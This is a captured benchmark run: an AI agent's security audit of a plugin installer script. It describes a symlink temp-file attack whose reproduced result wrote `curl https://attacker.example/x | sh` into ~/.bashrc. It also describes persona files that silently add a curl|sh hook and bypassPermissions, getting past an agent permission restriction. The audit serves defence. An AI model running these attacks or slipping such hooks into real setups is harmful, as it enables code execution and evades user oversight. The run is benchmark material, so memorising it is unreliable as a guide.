# Run truecast-2: truecast's `security-engineer` 1.2.2

One of 18 runs behind Fig. 2 on truecast.dev. Captured 2026-10-16 with Claude Code 2.1.301 and `claude-opus-5-5`, run as `claude -p "$PROMPT" --agent security-engineer`. Whole session: $1.14, 4.3 min. Below the line is the agent's final message, unedited. Method and scoring: [README](README.md).

---

**Verdict: yes, someone can get owned, but only through `--project`. That path is NO-GO until F1 is fixed. The user-scope lane is GO, as long as F2 is fixed before the next release.** I wrote the full verdict to `docs/security/verdict-plugin-installer.md`.

### F1 — P1: a hostile repo can write any file in your home, which leads to code execution (reproduced)
**Where:** `truecast-plugin.sh:507-510` (`remove_gitignore_line`) and `:481-482` (`write_agent_file`).

**The bug:** `safe_write` checks the final path. It never checks the `.tmp-$$` file written next to it. Both `>` and `cp` write through a symlink that is already sitting at that name. The PID (`$$`) is the only part the attacker can't know, so the repo just commits a symlink for every likely PID.

**The attack:**
- The repo ships three things:
  - a `.gitignore` containing `.claude/agents/qa.md` plus `curl …|sh`;
  - a `.claude/agents/qa.md` with the "GENERATED by truecast" stamp;
  - many `.gitignore.tmp-<N>` symlinks, all pointing at `~/.bashrc`.
- The victim runs `/truecast:remove qa --project`.
- **What I saw:** the script printed `status=removed`, and `~/.bashrc` then held only `curl https://attacker.example/x | sh # PWNED`.
- **The install path is affected too.** The same symlinks overwrote `~/.ssh/authorized_keys` with the persona text, and the script still reported `status=installed`.

**How likely:** macOS PIDs stay below 100000, so a repo can cover nearly all of them. On Linux the PID range is usually much larger, so there it's a lottery the attacker can retry. Either way, the victim has to run a `--project` command inside that repo.

**Fix:** one helper used for all three temp writes. It creates the temp file with `mktemp "$dir/.name.XXXXXX"` (a fresh random name, never an existing file), writes into it, sets `chmod 644`, then `mv -f` it into place. The verdict file includes a regression test for T-S2 (plant symlinks for the next PIDs, then check a canary file is unchanged).

### F2 — P2: the install plan shows only `tools:`, so `hooks:` and `permissionMode: bypassPermissions` go in without the user seeing them (reproduced)
**Where:** `:285-289` and `:315-319`.

**The bug:** Claude Code reportedly ignores `hooks`, `mcpServers` and `permissionMode` in subagents that come from plugins. This script copies the marketplace's `subagent.md` into `~/.claude/agents/`, where they are honoured. So a forked or taken-over marketplace gets past that restriction.

**What I saw:** I added a `Stop` hook running `curl|sh` and `bypassPermissions` to a persona. The plan showed only `tools granted to @qa: Read, Grep, …`, and `--yes` wrote both fields.

**Fix:**
- Accept only the frontmatter keys `name`, `description`, `model` and `tools`. Refuse repeated keys, list lines, and a `name` that doesn't match.
- Refuse symlinks inside the clone's `core/`, because `cp -R` at `:411` copies them as links.

### F3 — P3: the commands don't say how to handle a `--project <path>`
Step 0 checks the name but says nothing about quoting or checking the path. Add one sentence telling the model to shell-quote it.

### Accepted risk, needs your sign-off
- The script runs from the marketplace clone's latest commit, not the installed plugin version. It confirms the marketplace with a single `grep` for its name.
- With `install --project` in a hostile repo, a planted stamped file puts the repo's text into the diff the model reads. The commands already label all output as data, so the added risk is small.

**What held up:** name and version checks before anything touches a path, the symlink walk, every `rm -rf` staying inside the home, credentials stripped from the git remote, safe escaping in `meta.json`, and plan-before-write in all four commands. Details are in the verdict file.

**Frontier check:**
- Benchmark: the T-S2/T-S4 rules in the repo's own design doc, judged the way Trail of Bits or Project Zero would judge a temp-file and symlink audit of an installer.
- Coverage: every write, every delete, and every value read from the marketplace copy, the PID mechanics, the four slash commands, and the agent-file fields Claude Code honours.
- Verification: both findings were run end to end against the real script in a throwaway HOME.
- Limits: the field list for subagents comes from third-party mirrors of the Claude Code docs; my test proved only that those fields get written unseen. I haven't added the regression tests to the suite. Writing them is the engineer's job, and the specs are in the verdict.
